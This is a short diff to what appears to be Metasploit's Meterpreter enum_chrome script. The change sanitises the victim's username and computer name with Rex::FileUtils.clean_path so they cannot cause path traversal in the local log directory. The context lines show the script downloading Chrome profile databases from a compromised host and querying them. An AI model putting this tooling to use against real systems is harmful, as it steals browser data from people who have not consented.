@@ -132,8 +132,8 @@ end
 
 def process_files(username)
 	@chrome_files.each do |item|
-		in_file = File.join(@log_dir, username, item[:in_file])
-		out_file = File.join(@log_dir, username, item[:out_file])
+		in_file = File.join(@log_dir, Rex::FileUtils.clean_path(username), item[:in_file])
+		out_file = File.join(@log_dir, Rex::FileUtils.clean_path(username), item[:out_file])
 		if item[:sql]
 			db = SQLite3::Database.new(in_file)
 			columns, *rows = db.execute2(item[:sql])
@@ -175,7 +175,7 @@ def extract_data(username)
 
 	@chrome_files.map{ |e| e[:in_file] }.uniq.each do |f|
 		remote_path = chrome_path + '\\' + f
-		local_path = File.join(@log_dir, username, f)
+		local_path = File.join(@log_dir, Rex::FileUtils.clean_path(username), f)
 		print_status("downloading file #{f} to '#{local_path}'...")
 		client.fs.file.download_file(local_path, remote_path)
 	end
@@ -194,7 +194,7 @@ if @migrate
 end
 
 host = session.tunnel_peer.split(':')[0]
-@log_dir = File.join(Msf::Config.log_directory, "scripts", "enum_chrome", @host_info['Computer'], Time.now.strftime("%Y%m%d.%H%M"))
+@log_dir = File.join(Msf::Config.log_directory, "scripts", "enum_chrome", Rex::FileUtils.clean_path(@host_info['Computer']), Time.now.strftime("%Y%m%d.%H%M"))
 ::FileUtils.mkdir_p(@log_dir)
 
 sysdrive = client.fs.file.expand_path("%SYSTEMDRIVE%")
